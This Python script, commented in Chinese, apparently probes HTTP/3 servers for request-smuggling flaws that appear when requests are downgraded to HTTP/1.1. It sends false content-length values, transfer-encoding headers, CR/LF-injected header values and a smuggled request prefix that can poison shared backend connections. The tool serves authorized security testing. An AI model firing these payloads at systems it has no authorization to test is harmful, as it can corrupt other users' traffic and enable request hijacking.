#!/usr/bin/env python3
"""
h3_smuggle_probe.py v2.1 — HTTP/3 协议降级请求走私（H3.CL / 头部走私）检测脚本

仅用于你自己拥有或已获得书面授权的目标的安全测试。
未授权地对第三方系统进行测试可能违反法律法规。

原理概述：
  HTTP/3 的 DATA 帧自带显式长度，RFC 9114 不允许 transfer-encoding，
  但仍允许携带 content-length 头。若边缘节点（CDN / QUIC 终止代理）
  在 H3 -> HTTP/1.1 降级时"透传"客户端的 content-length 而非按实际
  帧长度重写，前后端对请求边界的判定就会失同步（desync），
  残留字节会被拼接到同一后端连接上的下一个请求——即请求走私。

两阶段流程（v2.1）：
  ┌─ 阶段一：HTTP/3 能力探测（标准请求）──────────────────────┐
  │ 1. Alt-Svc 自动发现（TCP+TLS，辅助信号，--skip-discovery 跳过）│
  │ 2. QUIC 握手 + 标准 GET 请求验证（自动重试，排除网络抖动）    │
  │    判定依据：握手成功（隐含 ALPN 'h3' 协商成功）且收到带      │
  │    :status 的响应                                             │
  │ 3. 不支持 → 打印原因并终止，不进入走私探测                    │
  └──────────────────────────────────────────────────────────────┘
  ┌─ 阶段二：请求走私探测（仅在确认支持 H3 后执行）──────────────┐
  │ 动态超时基准 dt = max(--timeout, 基线时延*3 + 2s)，           │
  │ 各测试项使用独立 QUIC 连接，按"残留风险递增"排序。             │
  └──────────────────────────────────────────────────────────────┘

检测技术（阶段二）：
  T1  CL under-read 时延差分：对照请求（CL 与帧体一致）vs 探测请求
      （CL=10 实际 3B），仅当"对照正常而探测挂起/显著变慢"时报警
  T2  CL over-read 三段式投毒：基线探测 -> CL=0+走私前缀 -> 复探测，
      只对"投毒前后发生变化"的信号报警；多轮多数表决
  T3  重复 content-length 头（冲突值）：转换层不做冲突校验的检测
  T4  大写头名：RFC 9114 §4.2 要求全小写，宽松实现可能透传
  T5  CL + transfer-encoding 组合：H3 禁 TE，透传即复活 CL.TE 走私
  T6  DATA 帧分片：一致分片聚合（6a）+ 帧间 over-read 投毒（6b）
  T7  头值 CR/LF 注入：RFC 9114 §4.2 头值禁 CR/LF/NUL（7a 接受性
      + 7b 注入走私前缀投毒）

变更历史：
  v2.1  探测流程重构为两阶段：先标准请求确认 HTTP/3 支持（含自动重试与
        失败分类输出），确认后才执行走私探测；不支持时明确终止
  v2.0  [P0] async with 连接生命周期 / 动态超时 + T1 时延差分 /
        ssl.CERT_NONE；[P1] T2 三段式差分 + 多轮表决 + 每测试独立连接；
        [P2] 事件槽先注册后 transmit、原子取走事件、T4/T5 注释修正、
        Alt-Svc 发现、新增 T6/T7
  v1.x  初版

依赖： pip install aioquic   （需要 Python 3.9+）
用法： python h3_smuggle_probe.py --host example.com [--path /] [--port 443]
                 [--rounds 2] [--insecure] --i-have-authorization
"""

import argparse
import asyncio
import hashlib
import socket
import ssl
import sys
import time
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from typing import List, Optional, Sequence, Tuple

try:
    from aioquic.asyncio.client import connect
    from aioquic.asyncio.protocol import QuicConnectionProtocol
    from aioquic.h3.connection import H3Connection
    from aioquic.h3.events import DataReceived, HeadersReceived, H3Event
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.quic.events import QuicEvent
except ImportError:
    print("[!] 缺少依赖，请先安装: pip install aioquic")
    sys.exit(1)


# ---------------------------------------------------------------------------
# QUIC + HTTP/3 最小客户端（手工收发，不做头部规范化）
# ---------------------------------------------------------------------------

@dataclass
class H3Response:
    status: Optional[int] = None
    headers: List[Tuple[bytes, bytes]] = field(default_factory=list)
    body: bytes = b""
    elapsed: float = 0.0
    timed_out: bool = False
    error: str = ""


class RawH3Client(QuicConnectionProtocol):
    """手工驱动的 H3 客户端：允许发送任意头组合，不做规范化。

    事件模型（单线程 asyncio）：
      - quic_event_received 由 aioquic 在事件循环回调中同步调用，
        将 H3 事件按 stream_id 落桶并唤醒对应 waiter；
      - send_raw_request / wait_response 的关键块均无 await 点，
        回调不可能在中间插入（"先注册后 transmit"、"原子取走"
        进一步防御未来在消费循环中引入 await 导致的竞态）。
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._h3: Optional[H3Connection] = None
        self._events: dict = {}          # stream_id -> list[H3Event]
        self._waiters: dict = {}         # stream_id -> asyncio.Event

    def ensure_h3(self) -> H3Connection:
        if self._h3 is None:
            self._h3 = H3Connection(self._quic)
        return self._h3

    def quic_event_received(self, event: QuicEvent) -> None:
        if self._h3 is not None:
            for h3_event in self._h3.handle_event(event):
                sid = h3_event.stream_id
                self._events.setdefault(sid, []).append(h3_event)
                if sid in self._waiters:
                    self._waiters[sid].set()

    def send_raw_request(
        self,
        headers: List[Tuple[bytes, bytes]],
        body: bytes = b"",
        end_stream: bool = True,
        chunks: Optional[Sequence[bytes]] = None,
    ) -> int:
        """发送请求并返回 stream_id。

        chunks 提供时按多个 DATA 帧逐片发送（T6 分片测试用），
        body 参数被忽略。事件槽在 transmit() 之前注册完毕。
        """
        h3 = self.ensure_h3()
        sid = self._quic.get_next_available_stream_id()
        # 先注册槽与 waiter，再触发网络发送（防御性时序）
        self._events[sid] = []
        self._waiters[sid] = asyncio.Event()
        has_payload = bool(body) or bool(chunks)
        h3.send_headers(stream_id=sid, headers=headers,
                        end_stream=(end_stream and not has_payload))
        if chunks:
            for i, chunk in enumerate(chunks):
                h3.send_data(stream_id=sid, data=chunk,
                             end_stream=(end_stream and i == len(chunks) - 1))
        elif body:
            h3.send_data(stream_id=sid, data=body, end_stream=end_stream)
        self.transmit()
        return sid

    async def wait_response(self, sid: int, timeout: float) -> H3Response:
        resp = H3Response()
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout
        stream_ended = False
        while loop.time() < deadline and not stream_ended:
            remaining = deadline - loop.time()
            try:
                await asyncio.wait_for(self._waiters[sid].wait(), timeout=remaining)
            except asyncio.TimeoutError:
                break
            self._waiters[sid].clear()
            # 原子取走本轮事件（swap 语义，避免任何丢失可能）
            pending, self._events[sid] = self._events.get(sid, []), []
            for ev in pending:
                if isinstance(ev, HeadersReceived):
                    for k, v in ev.headers:
                        if k == b":status":
                            try:
                                resp.status = int(v)
                            except ValueError:
                                pass
                        resp.headers.append((k, v))
                    if ev.stream_ended:
                        stream_ended = True
                elif isinstance(ev, DataReceived):
                    resp.body += ev.data
                    if ev.stream_ended:
                        stream_ended = True
        if not stream_ended and resp.status is None:
            resp.timed_out = True
        return resp


@asynccontextmanager
async def h3_session(host: str, port: int, insecure: bool):
    """统一用 async context manager 管理 QUIC 连接生命周期。"""
    conf = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
    if insecure:
        # 规范写法：v1 的 verify_mode=False 恰好等价 ssl.CERT_NONE(==0)，
        # 但依赖实现巧合
        conf.verify_mode = ssl.CERT_NONE
    async with connect(host, port, configuration=conf,
                       create_protocol=RawH3Client) as client:
        yield client


# ---------------------------------------------------------------------------
# 请求构造与通用工具
# ---------------------------------------------------------------------------

def base_headers(host: str, path: str, method: bytes = b"GET") -> List[Tuple[bytes, bytes]]:
    return [
        (b":method", method),
        (b":scheme", b"https"),
        (b":authority", host.encode()),
        (b":path", path.encode()),
        (b"user-agent", b"h3-smuggle-probe/2.1"),
    ]


def post_headers(host: str, path: str, content_length: int) -> List[Tuple[bytes, bytes]]:
    return base_headers(host, path, b"POST") + [
        (b"content-type", b"application/x-www-form-urlencoded"),
        (b"content-length", str(content_length).encode()),
    ]


def smuggled_prefix(host: str) -> bytes:
    """伪造的 HTTP/1.1 请求前缀：若后端按 CL=0 处理外层请求，
    剩余字节会被当作同连接下一请求的开头。"""
    return (
        b"POST /h3-smuggle-canary HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: 10\r\n\r\n"
    )


async def fetch(client: RawH3Client, headers, body: bytes = b"",
                timeout: float = 8.0, chunks: Optional[Sequence[bytes]] = None) -> H3Response:
    sid = client.send_raw_request(headers, body, chunks=chunks)
    t0 = time.monotonic()
    resp = await client.wait_response(sid, timeout)
    resp.elapsed = time.monotonic() - t0
    return resp


def signature(resp: H3Response) -> str:
    """探测请求响应指纹（状态行 + body），用于投毒前后差分。"""
    return hashlib.sha256(f"{resp.status}|".encode() + resp.body).hexdigest()[:12]


async def poison_and_probe(
    client: RawH3Client,
    host: str,
    path: str,
    timeout: float,
    poison_headers: List[Tuple[bytes, bytes]],
    poison_body: bytes = b"",
    chunks: Optional[Sequence[bytes]] = None,
    markers: Tuple[bytes, ...] = (b"h3-smuggle-canary",),
) -> Tuple[str, str]:
    """三段式投毒探测（T2/T6b/T7b 共用）：
       基线探测 -> 投毒请求 -> 复探测，仅对"前后变化"报警。

    返回 (level, note)，level ∈ {strong, weak, clean, unknown}：
      strong — 复探测响应出现走私 canary（基线响应无）——最强证据
      weak   — 投毒后探测挂起 / 状态码劣化 / 响应指纹变化——需人工复核
      clean  — 前后一致
      unknown— 基线探测本身超时，本轮放弃
    """
    p0 = await fetch(client, base_headers(host, path), b"", timeout)
    if p0.timed_out:
        return "unknown", "基线探测超时，目标不稳定，本轮放弃"
    # 投毒请求自身的响应也等待完成，保证投毒字节已被转换层处理
    await fetch(client, poison_headers, poison_body, timeout, chunks=chunks)
    p1 = await fetch(client, base_headers(host, path), b"", timeout)

    if p1.timed_out:
        return ("weak",
                f"投毒后探测请求挂起（基线 status={p0.status}，{p0.elapsed:.2f}s 正常）"
                "——典型 desync 信号，需人工复核")
    hit = any(m in p1.body for m in markers)
    base_hit = any(m in p0.body for m in markers)
    if hit and not base_hit:
        return ("strong",
                f"复探测响应出现走私 canary（基线无）：status={p1.status}，"
                f"片段 {p1.body[:120]!r}。注意人工区分'响应错位'与'错误页回显'"
                "（回显型页面会包含完整走私请求文本）")
    if p1.status is not None and p1.status >= 400 and (p0.status or 0) < 400:
        return ("weak",
                f"探测请求状态 {p0.status} -> {p1.status}（>=400），疑似被残留污染")
    if signature(p0) != signature(p1):
        return ("weak",
                f"探测响应指纹在投毒前后变化（{signature(p0)[:8]} -> {signature(p1)[:8]}），"
                "疑似被污染（注意排除服务端动态内容干扰）")
    return "clean", f"探测请求前后一致（status={p1.status}），未见污染"


async def discover_alt_svc(host: str, port: int, insecure: bool) -> Optional[str]:
    """通过 TCP+TLS 发一个 HTTP/1.1 请求读取 Alt-Svc 头（辅助发现 H3 能力）。
    失败不阻塞主流程。"""
    def _do() -> Optional[str]:
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as tls:
                tls.sendall(
                    f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                    f"User-Agent: h3-smuggle-probe/2.1\r\nConnection: close\r\n\r\n".encode()
                )
                data = b""
                while b"\r\n\r\n" not in data:
                    chunk = tls.recv(4096)
                    if not chunk:
                        break
                    data += chunk
        for line in data.split(b"\r\n"):
            if line.lower().startswith(b"alt-svc:"):
                return line.split(b":", 1)[1].decode(errors="replace").strip()
        return None

    try:
        return await asyncio.to_thread(_do)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# 阶段一：HTTP/3 能力探测（标准请求）
# ---------------------------------------------------------------------------

async def probe_h3_support(host: str, port: int, path: str, insecure: bool,
                           timeout: float, attempts: int = 2) -> Tuple[bool, Optional[H3Response]]:
    """发送标准请求探测目标是否真正支持 HTTP/3。

    判定依据（全部满足才认为支持）：
      1. QUIC 握手成功 —— 服务器不同意 ALPN 'h3' 时握手即失败，
         因此握手成功隐含 ALPN 协商成功；
      2. 标准 GET 请求收到带 :status 头的有效响应。

    自动重试 attempts 次（默认 2），排除一次性网络抖动。
    返回 (是否支持, 基线响应)。基线响应用于阶段二的动态超时基准。
    """
    for i in range(attempts):
        try:
            async with h3_session(host, port, insecure) as client:
                resp = await fetch(client, base_headers(host, path), b"", timeout)
        except Exception as e:
            print(f"[*] 第{i + 1}次尝试：QUIC 连接/握手失败（{e}）")
            continue
        if resp.timed_out or resp.status is None:
            print(f"[*] 第{i + 1}次尝试：QUIC 握手成功，但标准请求未收到有效响应"
                  f"（timed_out={resp.timed_out}, status={resp.status}）")
            continue
        return True, resp
    return False, None


# ---------------------------------------------------------------------------
# 阶段二：各项走私检测（每个测试独立 QUIC 连接，投毒类排在最后）
# ---------------------------------------------------------------------------

async def test_t3_duplicate_cl(client, host, path, dt, _rounds) -> str:
    """T3: 发送两个冲突的 content-length，检测转换层是否规范化。
    RFC 9110 §8.6 / RFC 9114 语境下冲突 CL 应被拒绝。"""
    headers = base_headers(host, path, b"POST") + [
        (b"content-type", b"application/x-www-form-urlencoded"),
        (b"content-length", b"0"),
        (b"content-length", b"5"),
    ]
    resp = await fetch(client, headers, b"a=1", dt)
    if resp.timed_out:
        return "[T3] 重复 CL 导致超时：前后端可能取了不同 CL 值，存在失同步风险。"
    if resp.status in (400, 421):
        return f"[T3] 转换层拒绝了重复 CL（status={resp.status}），行为安全。"
    return f"[T3] 重复 CL 被接受（status={resp.status}），建议人工核查后端如何取值。"


async def test_t4_uppercase_header(client, host, path, dt, _rounds) -> str:
    """T4: 大写头名。RFC 9114 §4.2 要求头名全小写，违规应被 H3_MESSAGE_ERROR 拒绝；
    宽松的转换层可能透传给后端，复活 H1 时代的混淆面。
    注：实测 aioquic 客户端发送侧不校验头名（校验仅在其服务端接收路径），
    本地 except 仅防御 QPACK 编码层异常。"""
    headers = base_headers(host, path) + [
        (b"X-Smuggle-Test", b"1"),   # 非法：含大写
    ]
    try:
        resp = await fetch(client, headers, b"", dt)
    except Exception as e:
        return f"[T4] 本地发送异常（{e}）——请检查 aioquic 版本行为。"
    if resp.timed_out:
        return "[T4] 大写头请求超时，无法判定。"
    if resp.status is not None and resp.status < 400:
        return (f"[T4] 大写头被接受（status={resp.status}）：实现未严格执行小写规范，"
                "头部走私面值得进一步人工审计。")
    return f"[T4] 大写头被拒绝（status={resp.status}），行为符合 RFC 9114。"


async def test_t5_cl_te_combo(client, host, path, dt, _rounds) -> str:
    """T5: H3 中禁止 transfer-encoding（RFC 9114 §4.4），但若转换层不剥离而透传，
    相当于在 H1 后端复活 CL.TE 走私。"""
    headers = base_headers(host, path, b"POST") + [
        (b"content-type", b"application/x-www-form-urlencoded"),
        (b"content-length", b"4"),
        (b"transfer-encoding", b"chunked"),
    ]
    try:
        resp = await fetch(client, headers, b"a=1", dt)
    except Exception as e:
        return f"[T5] 本地发送异常（{e}）。"
    if resp.timed_out:
        return "[T5] CL+TE 组合导致超时：转换层疑似透传 TE，存在 CL.TE 走私风险！"
    if resp.status in (400, 501):
        return f"[T5] TE 被拒绝（status={resp.status}），行为安全。"
    return f"[T5] CL+TE 被接受（status={resp.status}），需人工确认后端边界判定。"


async def test_t6_frame_fragmentation(client, host, path, dt, rounds) -> str:
    """T6: DATA 帧分片。
    6a 一致分片（CL=6，两帧各 3B）——正确实现应聚合后正常处理；
    6b 帧间 over-read（CL=3，帧1 与 CL 匹配、帧2 携带走私前缀）——
       检测"逐帧转换/逐帧转发"型实现是否泄漏帧间残留。"""
    r6a = await fetch(client, post_headers(host, path, 6), b"", dt,
                      chunks=[b"x=1", b"=ok"])
    if r6a.timed_out:
        part_a = "6a 一致分片请求超时——分片聚合可能异常"
    elif r6a.status is not None and r6a.status < 400:
        part_a = f"6a 一致分片被正常处理（status={r6a.status}，{r6a.elapsed:.2f}s）"
    else:
        part_a = f"6a 一致分片被拒绝（status={r6a.status}）——转换层可能不支持分片聚合，需人工核查"

    counts = {"strong": 0, "weak": 0, "clean": 0, "unknown": 0}
    for _ in range(rounds):
        level, _note = await poison_and_probe(
            client, host, path, dt,
            poison_headers=post_headers(host, path, 3),
            chunks=[b"x=1", smuggled_prefix(host)])
        counts[level] += 1
    if counts["strong"]:
        part_b = f"6b 强信号 x{counts['strong']}/{rounds}：帧间 over-read 走私疑似成立，需人工复验"
    elif counts["weak"] >= max(1, rounds // 2):
        part_b = f"6b 弱信号 x{counts['weak']}/{rounds}：探测请求疑似被帧残留污染，需人工复验"
    else:
        part_b = f"6b 未见帧间 over-read 污染（{rounds} 轮）"
    return f"[T6] {part_a}；{part_b}。"


async def test_t1_latency_differential(client, host, path, dt, rounds) -> str:
    """T1: CL under-read 时延差分。
    同连接先发 CL 与帧体一致的对照请求，再发 CL=10 / 实际 3B 的探测请求；
    仅当"对照正常而探测挂起/显著变慢"时报警，排除普通慢响应的假阳性。
    若探测命中（后端挂起等待缺失字节），当前连接已被污染，直接返回。"""
    for i in range(rounds):
        control = await fetch(client, post_headers(host, path, 3), b"x=1", dt)
        if control.timed_out:
            return f"[T1] 第{i + 1}轮对照请求即超时，目标不稳定，T1 无法判定。"
        probe = await fetch(client, post_headers(host, path, 10), b"x=1", dt)
        if probe.timed_out:
            return (f"[T1] 疑似 H3.CL under-read：第{i + 1}轮对照 {control.elapsed:.2f}s 正常，"
                    f"CL=10（实际 3B）探测超时（>{dt:.1f}s）。转换层疑似透传了 CL。")
        delta = probe.elapsed - control.elapsed
        if delta > max(2.0, control.elapsed * 2):
            return (f"[T1] 弱信号：第{i + 1}轮探测较对照慢 {delta:.2f}s"
                    f"（control={control.elapsed:.2f}s, probe={probe.elapsed:.2f}s），需人工复核。")
    return f"[T1] {rounds} 轮对照/探测时延一致，未见 under-read 特征。"


async def test_t2_over_read_poison(client, host, path, dt, rounds) -> str:
    """T2: CL over-read 三段式投毒。
    基线探测 -> POST CL=0 + 走私前缀 -> 复探测；多轮表决。
    仅对'投毒前后发生变化'的信号报警，探测请求自身 4xx（限流/WAF 等）
    因基线同样是 4xx 而不再误报。"""
    counts = {"strong": 0, "weak": 0, "clean": 0, "unknown": 0}
    last_note = ""
    for i in range(rounds):
        level, note = await poison_and_probe(
            client, host, path, dt,
            poison_headers=post_headers(host, path, 0),
            poison_body=smuggled_prefix(host))
        counts[level] += 1
        last_note = f"第{i + 1}轮：{note}"
    if counts["strong"]:
        return (f"[T2] 强信号 x{counts['strong']}/{rounds}（canary 出现在复探测响应）。"
                f"{last_note}")
    if counts["weak"] >= max(1, rounds // 2):
        return f"[T2] 弱信号 x{counts['weak']}/{rounds}：{last_note}"
    return f"[T2] {rounds} 轮复探测与基线一致，未见 over-read 污染。"


async def test_t7_header_value_injection(client, host, path, dt, rounds) -> str:
    """T7: 头值 CR/LF 注入。
    RFC 9114 §4.2 头值禁止 CR/LF/NUL。7a 探测接受性；
    7b 在头值中嵌入完整走私前缀（经典 H1 header-injection smuggling），
    若转换层原样拼接头值到 H1 输出，即复探测被污染。"""
    headers_a = base_headers(host, path) + [
        (b"x-smuggle-probe", b"1\r\nX-Injected: yes"),
    ]
    ra = await fetch(client, headers_a, b"", dt)
    if ra.timed_out:
        return "[T7] 7a 含 CR/LF 头值请求超时，无法判定。"
    if ra.status is not None and ra.status < 400:
        part_a = (f"7a 含 CR/LF 头值被接受（status={ra.status}）——"
                  "转换层疑似未剥离非法字符，注入面存在")
    else:
        part_a = f"7a 含 CR/LF 头值被拒绝（status={ra.status}），行为符合规范"

    injected = b"1\r\nX-Smuggle-Marker: a\r\n\r\n" + smuggled_prefix(host)
    headers_b = post_headers(host, path, 0) + [
        (b"x-smuggle-probe", injected),
    ]
    counts = {"strong": 0, "weak": 0, "clean": 0, "unknown": 0}
    for _ in range(rounds):
        level, _note = await poison_and_probe(
            client, host, path, dt, poison_headers=headers_b)
        counts[level] += 1
    if counts["strong"]:
        part_b = f"7b 强信号 x{counts['strong']}/{rounds}：头值注入走私疑似成立，需人工复验"
    elif counts["weak"] >= max(1, rounds // 2):
        part_b = f"7b 弱信号 x{counts['weak']}/{rounds}：疑似注入污染，需人工复验"
    else:
        part_b = f"7b 未见注入污染（{rounds} 轮）"
    return f"[T7] {part_a}；{part_b}。"


# ---------------------------------------------------------------------------
# 主流程：两阶段
# ---------------------------------------------------------------------------

async def run(args) -> None:
    print(f"[*] 目标: https://{args.host}:{args.port}{args.path}  (HTTP/3, QUIC)")

    # ================= 阶段一：HTTP/3 能力探测（标准请求） =================
    print("\n===== 阶段一：HTTP/3 能力探测（标准请求） =====")

    if not args.skip_discovery:
        alt = await discover_alt_svc(args.host, args.port, args.insecure)
        if alt:
            print(f"[*] Alt-Svc: {alt}")
            print("    （含 h3 条目即官方声明支持 HTTP/3）")
        else:
            print("[*] 未发现 Alt-Svc 头（不代表不支持，继续 QUIC 直连验证）")

    supported, base = await probe_h3_support(
        args.host, args.port, args.path, args.insecure, args.timeout)
    if not supported:
        print("\n[!] 阶段一结论：目标不支持 HTTP/3（QUIC/UDP 不可达、ALPN 拒绝 h3、")
        print("    或握手成功但无有效 H3 响应）。")
        print("    走私探测依赖 H3 语法构造畸形请求，前提不成立，测试终止。")
        print("    排查建议：UDP/443 出网是否被防火墙拦截；目标是否仅支持 H1/H2；")
        print("    自签名环境请加 --insecure。")
        return False

    # v2：动态超时基准，排除"目标本来就慢"的假阳性
    dt = max(args.timeout, base.elapsed * 3 + 2.0)
    print(f"[*] 阶段一结论：目标支持 HTTP/3 —— 标准请求 status={base.status}, "
          f"{base.elapsed:.2f}s, body={len(base.body)}B")
    print(f"[*] 动态超时基准 dt={dt:.1f}s（max({args.timeout}s, 基线*3+2s)）")

    # ================= 阶段二：请求走私探测 =================
    print("\n===== 阶段二：请求走私探测 =====")

    # 顺序按"残留风险递增"排列：无残留 -> 可能挂起 -> 投毒类
    tests = [
        ("T3 重复 content-length", test_t3_duplicate_cl),
        ("T4 大写头部名", test_t4_uppercase_header),
        ("T5 CL + transfer-encoding 组合", test_t5_cl_te_combo),
        ("T6 DATA 帧分片", test_t6_frame_fragmentation),
        ("T1 CL under-read 时延差分", test_t1_latency_differential),
        ("T2 CL over-read 三段式投毒", test_t2_over_read_poison),
        ("T7 头值 CR/LF 注入", test_t7_header_value_injection),
    ]
    for name, fn in tests:
        print(f"--- {name} ---")
        try:
            async with h3_session(args.host, args.port, args.insecure) as client:
                print(await fn(client, args.host, args.path, dt, args.rounds))
        except Exception as e:
            print(f"[{name}] 执行异常: {e}")
        print()

    print("[*] 测试完成。任何'强/弱信号'都应人工复验（时延差/响应差/日志对照）。")
    print("    自动化探测存在误报；确认走私需证明跨请求的响应污染。")
    print("    注意：T2/T6b/T7b 若在共享连接池的生产环境命中，可能影响其他用户请求，")
    print("    请确保在授权且可承受副作用的窗口内执行。")
    return True


def main() -> None:
    p = argparse.ArgumentParser(
        description="HTTP/3 协议降级请求走私检测 v2.1（两阶段：先验证 H3 支持，再走私探测；仅限授权测试）")
    p.add_argument("--host", required=True, help="目标主机名，例如 example.com")
    p.add_argument("--port", type=int, default=443, help="UDP 端口（默认 443）")
    p.add_argument("--path", default="/", help="请求路径（默认 /）")
    p.add_argument("--timeout", type=float, default=8.0,
                   help="单请求超时下限秒数（实际取 max(该值, 基线*3+2s)）")
    p.add_argument("--rounds", type=int, default=2,
                   help="投毒/差分类测试的重复轮数（默认 2，多数表决）")
    p.add_argument("--insecure", action="store_true",
                   help="跳过证书校验（测试自签名环境）")
    p.add_argument("--skip-discovery", action="store_true",
                   help="跳过 Alt-Svc 自动发现")
    p.add_argument("--i-have-authorization", action="store_true",
                   help="确认你已获得对该目标的安全测试授权")
    args = p.parse_args()

    if not args.i_have_authorization:
        print("[!] 请确认你对目标拥有书面测试授权，并添加 --i-have-authorization 参数。")
        sys.exit(2)
    if args.rounds < 1:
        print("[!] --rounds 必须 >= 1")
        sys.exit(2)

    ok = asyncio.run(run(args))
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
